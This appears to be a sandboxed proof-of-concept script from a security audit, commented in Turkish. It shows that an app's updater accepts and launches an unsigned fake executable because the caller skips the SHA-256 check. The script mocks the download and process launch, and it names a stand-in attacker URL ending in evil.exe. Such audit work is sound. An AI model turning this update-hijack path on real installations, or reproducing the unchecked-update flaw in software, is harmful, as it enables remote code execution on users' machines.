#!/usr/bin/env python3
"""PoC 09: Updater imzasiz ikili dosya calistirir; SHA-256 dogrulamasi olu kod.

Zafiyet: app.py:813 apply_executable_update(down_url) cagirirken expected_sha256
PARAMETRESINI HIC GECMEZ. Fonksiyonda yalnizca MZ sihirli baytlari + 1MB boyut
kontrolu vardir; bunlar sahtelenebilir. HTTPS allowlist'i kotu niyetli surum
varligina karsi koruma saglamaz (depo/muhasebe ele gecirilirse RCE).
"""
import os
import sys
import shutil

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc09"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)

import updater


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


class FakeResp:
    def __init__(self, url):
        self._url = url

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def geturl(self):
        return self._url

    def read(self):
        return b"MZ" + b"\x41" * 2_000_000


class DummyExit(Exception):
    pass


banner("PoC 09: Imzasiz/zararli EXE'nin guncelleme olarak kabulu")

orig_urlopen = updater.urllib.request.urlopen
orig_popen = updater.subprocess.Popen
orig_exit = updater.sys.exit
captured = {}

updater.urllib.request.urlopen = lambda req, timeout=None, context=None: FakeResp(
    req.full_url if hasattr(req, "full_url") else str(req)
)
updater.subprocess.Popen = lambda args, **kw: captured.setdefault("popen", args)
if not hasattr(updater.subprocess, "CREATE_NO_WINDOW"):
    updater.subprocess.CREATE_NO_WINDOW = 0x08000000

def fake_exit(code=0):
    captured["exit"] = code

updater.sys.exit = fake_exit

print("[1] Saldırgan icerigi hazir: 2MB, yalnizca 'MZ' + rastgele bayt (gecerli PE DEGIL)")
print("    URL: https://github.com/saldirgan/repo/releases/download/v9/evil.exe (allowlist host: github.com)")
print("    expected_sha256 parametresi: None (app.py:813 boyle cagiriyor)")
res = updater.apply_executable_update("https://github.com/saldirgan/repo/releases/download/v9/evil.exe")
print(f"\n[2] sys.exit({captured.get('exit')}) cagrildi -> basari yolu (ikili kabul edildi, 'guncelleme' baslatildi)")

updater.urllib.request.urlopen = orig_urlopen
updater.subprocess.Popen = orig_popen
updater.sys.exit = orig_exit

popen_args = captured.get("popen")
print(f"[3] Calistirilan komut: {popen_args}")
print(f"[4] Diske yazilan sahte ikili: AegisVault_update.exe ({os.path.getsize('AegisVault_update.exe'):,} bayt)")
print(f"[5] Olusturulan installer: update_installer.bat")
print("    Icerik:")
for line in open("update_installer.bat", encoding="ascii").read().splitlines():
    print(f"      {line}")

print("\n[6] app.py'deki cagri yeri (SHA-256 argumani YOK):")
with open(os.path.join(PROJECT_DIR, "app.py"), encoding="utf-8") as f:
    lines = f.readlines()
for idx in (807, 812):
    print(f"    app.py:{idx+1}: {lines[idx].rstrip()}")

print("\n" + "-" * 72)
print("KANIT: MZ + >=1MB iceren HERHANGI bir yuk, hash/imza dogrulamasi olmadan")
print("       'guncelleme' olarak kabul edilip mevcut calistirilabilir dosyanin")
print("       uzerine yazilarak calistirildi. SHA-256 dogrulamasi pratikte olu kod.")
print("-" * 72)
